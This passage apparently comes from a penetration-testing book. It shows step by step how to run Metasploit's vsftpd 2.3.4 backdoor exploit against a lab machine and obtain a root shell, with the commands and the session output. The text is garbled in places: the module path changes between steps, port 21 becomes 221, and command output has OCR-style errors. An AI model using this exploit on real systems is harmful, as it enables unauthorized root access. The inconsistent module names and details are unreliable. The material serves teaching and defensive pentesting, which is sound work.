
# msf6 > info 0

```
Name: vsftpd v2.3.4 Backdoor Command Execution
Module: exploit/unix/vsftp/vsftpd_23ka_backdoor
Platform: unix
Payload: cmd any
Privileged: Yes
License: Metasploit Framework License (BSD)
Rank: Excellent
Disclosed: 2011-07-03
```

Provided By:
User: admin@example.io
MC: <admin@metasploit.com>

Available targets:
Id

+   - Automatic

Check Supported:
No

| Name | Current Setting | Required | Description |
|---|---|---|---|
| RHOSTS | yes | | The target host(s), range CIDR identifier, or hosts with syntax 'file:<path>' |
| RPORT | 21 | yes | The target port (TCP) |

Payload information:
Space: 206
Avoid: a characters

Description:
This module exploits a malicious backdoor that was added to the vsftp archive. This backdoor was introduced between June 20th 2011 and July 1st 2011

Figure 15.16 – Exploring additional information of exploits on Metasploit

As seen in Figure 15.16, we can call the exploit by using the long name or the identifier (in this case 0):

```
use 0
```

Now, let's set RHOST to the IP of the target machine:

```
set RHOST 192.168.1.224
```

Now the system shows a reply with a message that RHOST was set to the IP address, if you want to double-check, you can also show the options command, as in the following:

```
msf6 exploit(unix/vsftp/vsftpd_23_backdoor) > set RHOST 192.168.1.224
RHOST => 192.168.1.224
msf6 exploit(unix/vsftp/vsftpd_23_backdoor) > show options
```

Module options (exploit(unix/vsftp/vsftpd_23_backdoor):

| Name | Current Setting | Required | Description |
|---|---|---|---|
| RHOSTS | 192.168.1.224 | yes | The target host(s), range CIDR identifier, or hosts with syntax 'file:<path>' |
| RPORT | 21 | yes | The target port (TCP) |

Figure 15.17 – Using show options to confirm the exploit

## 420 Leveraging Pentesting for Defense Security

Now everything seems to be ready to execute the exploit with the following command:

```
run
```

And now, as seen in the following figure, we have full access to the target machine. In fact, you can also see that we can execute a lot of commands on the target (victim machine), so as whoami (which trivially shows that we are connected as root). Also, we did config to confirm that we are issuing the commands on the target machine:

```
msf6 exploit(linux/ftp/vsftpd_24_backdoor) > run
[*] 192.168.1.224:221 - Banner: 23 (vsFTPD 2.3.4)
[*] 192.168.1.224:221 - USER: User Please specify the password.
[*] 192.168.1.224:221 - Backdoor service has been spawned, handling ...
[*] 192.168.1.224:221 - UID: uid=(root) gid=(root)
[*] Found shell.
[*] Command session 1 opened (0.0.0.0 -> 192.168.1.224:6200) at 2021-08-06 02:09:10 -0400
```

```
whoami
root
config
eth0
link:Ethernet HWaddr 00:20:27:f3:8d:9f
net addr:192.168.1.224 broadcast:192.168.1.255 mask:255.255.255.0
net addr:192.168.1.224 broadcast:192.168.1.255 mask:255.255.255.0 scope:global
eth6 addr:00:20:27:f3:8d:9f scope:link
UP BROADCAST MULTICAST MTU:1500 Metric:1
RX packets:70873 errors:9 dropped:0 overruns:0 frame:0
TX packets:2763 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txuelen:1000
RX bytes:5805524 (5.5 MB) TX bytes:6320444 (6.0 MB)
Interrupt:10 Base address:0x020
```

```
ls
bin
boot
crom
dev
etc
home
itrd
initrd
initrd.img
lib
```

![](img/8c6a6)
